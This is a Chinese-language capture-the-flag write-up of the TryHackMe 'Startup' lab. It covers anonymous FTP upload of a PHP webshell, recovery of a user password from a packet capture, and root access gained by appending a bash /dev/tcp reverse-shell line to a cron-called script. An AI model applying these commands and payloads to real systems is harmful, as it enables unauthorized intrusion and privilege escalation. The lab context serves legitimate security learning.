# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务扫描
```
root💀kali)-[~]
└─# nmap -sV -Pn 10.10.171.61                           
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 02:51 EDT
Nmap scan report for 10.10.171.61
Host is up (0.32s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.61 seconds
```
开启了ftp,ssh,http服务

## 匿名登录ftp
```
┌──(root💀kali)-[~/tryhackme/Startup]
└─# ftp 10.10.171.61
Connected to 10.10.171.61.
220 (vsFTPd 3.0.3)
Name (10.10.171.61:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -alh
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

所有文件下载到本地分析，ftp文件夹里面没有任何东西，但是这个文件夹是可写的。

```notice.txt```内容

```
┌──(root💀kali)-[~/tryhackme/Startup]
└─# cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

maya可能是个ssh用户名？

```important.jpg```显示两行文字

```
Everybody asks who's the impostor
but nobody asks how's the impostor
```

没看明白有啥有用的信息。

## 渗透80端口
打开80服务看看，显示一段话：
```

No spice here!

Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, contact us. Otherwise, don't you worry. We'll be online shortly!

— Dev Team

```

网页源代码里有一行注释：
```
when are we gonna update this??
```

## 目录爆破看看
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.171.61                                                                                   
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )                                                                     
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.171.61/_21-11-06_03-07-44.txt

Error Log: /root/dirsearch/logs/errors-21-11-06_03-07-44.log

Target: http://10.10.171.61/

[03:07:45] Starting:  
[03:08:41] 301 -  312B  - /files  ->  http://10.10.171.61/files/            
[03:08:42] 200 -    1KB - /files/                                           
[03:08:47] 200 -  808B  - /index.html                                       
```

存在一个files文件夹，文件目录显示和ftp上是一样的。那渗透思路就很简单，直接ftp上传webshell到服务器，在web上访问触犯反弹shell,刚才我们已经知道，ftp文件夹是可写的

## ftp上传webshell
```
┌──(root💀kali)-[~/tryhackme/Startup]
└─# ftp 10.10.171.61
Connected to 10.10.171.61.
220 (vsFTPd 3.0.3)
Name (10.10.171.61:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> put /root/reverse-shell.php ./shell.php
local: /root/reverse-shell.php remote: ./shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
3460 bytes sent in 0.00 secs (28.6932 MB/s)

```

## 触发反弹，拿到webshell
```
┌──(root💀kali)-[~/tryhackme/Startup]
└─# nc -lnvp 1234                                       
listening on [any] 1234 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.171.61] 46938
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 07:14:50 up 24 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

根目录找到一个文件```recipe.txt ```
```
www-data@startup:/$ cat recipe.txt 
cat recipe.txt 
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.

```

> What is the secret spicy soup recipe?

> love

# 横向提权到lennie

查看```home```目录，发现存在一个用户：lennie，但是我们没有查看文件夹的权限
查看```/etc/passwd/```，发现另一个用户：vagrant



根目录还有一个文件夹```incidents```，所有者是```www-data```，里面有一个文件```suspicious.pcapng```,传回kali分析

用wirksharp查看数据包，貌似是上一手黑客的网络交互信息
在第177个数据片留下了lennie的密码
>c4ntg3t3n0ughsp1c3

拿到user.txt
```
www-data@startup:/tmp$ su lennie
su lennie
Password: c4ntg3t3n0ughsp1c3

lennie@startup:/tmp$ cd /home
cd /home
lennie@startup:/home$ ls
ls
lennie
lennie@startup:/home$ cd lennie
cd lennie
lennie@startup:~$ ls
ls
Documents  scripts  user.txt
```

# 提权到root

我们查看```scripts```文件夹以及里面的脚本
```
lennie@startup:~$ cd scripts
cd scripts
lennie@startup:~/scripts$ ls -alh
ls -alh
total 16K
drwxr-xr-x 2 root   root   4.0K Nov 12  2020 .
drwx------ 6 lennie lennie 4.0K Nov  6 08:43 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Nov  6 08:57 startup_list.txt
lennie@startup:~/scripts$ cat planner.sh 
cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh
cat /etc/print.sh
#!/bin/bash
echo "Done!"
lennie@startup:~/scripts$ ls -alh /etc/print.sh
ls -alh /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh


```

## 分析
planner.sh这个文件属于root，按文件名来看属于某种定时任务，普通用户对于这个文件没有写权限。但是这个脚本调用了另一个脚本```/etc/print.sh```，这个脚本的属组是lennie。也就是说我们可以把反弹shell写进这个脚本

## 攻击

写脚本到```/etc/print.sh```

```
lennie@startup:~/scripts$ echo "bash -i >& /dev/tcp/10.13.21.169/4242 0>&1" >> /etc/print.sh
<cho "bash -i >& /dev/tcp/10.13.21.169/4242 0>&1" >> /etc/print.sh           
lennie@startup:~/scripts$ cat /etc/print.sh
cat /etc/print.sh
#!/bin/bash
echo "Done!"
bash -i >& /dev/tcp/10.13.21.169/4242 0>&1
```

开启监听，等大约一分钟，拿到root权限
```
┌──(root💀kali)-[~/tryhackme/Startup]
└─# nc -lnvp 4242                                                                           
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.171.61] 49342
bash: cannot set terminal process group (2909): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@startup:~# cat /root/root.txt
cat /root/root.txt

```